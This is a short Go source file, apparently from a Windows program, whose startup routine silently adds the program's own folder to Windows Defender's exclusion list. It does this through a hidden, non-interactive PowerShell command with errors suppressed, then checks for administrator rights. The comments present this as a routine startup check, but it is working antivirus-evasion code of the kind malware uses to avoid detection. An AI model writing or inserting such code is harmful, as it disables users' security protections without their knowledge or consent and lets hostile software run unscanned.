package core

import (
"fmt"
"os"
"os/exec"
"path/filepath"
"syscall"
)

// EnsureDefenderExclusion comprueba y asegura que la carpeta de ejecución esté excluida en Defender
func EnsureDefenderExclusion() {
exePath, err := os.Executable()
if err != nil {
return
}
realPath, err := filepath.EvalSymlinks(exePath)
if err != nil {
realPath = exePath
}
exeDir := filepath.Dir(realPath)

psCmd := fmt.Sprintf(
"if (-not ((Get-MpPreference).ExclusionPath -contains '%s')) { Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue }",
exeDir, exeDir,
)

cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psCmd)
cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
_ = cmd.Run()
}

// IsAdmin verifica privilegios de Administrador en Windows
func IsAdmin() bool {
cmd := exec.Command("net", "session")
cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
return cmd.Run() == nil
}

// CheckStartup ejecuta las verificaciones críticas al arrancar
func CheckStartup() bool {
EnsureDefenderExclusion()
return IsAdmin()
}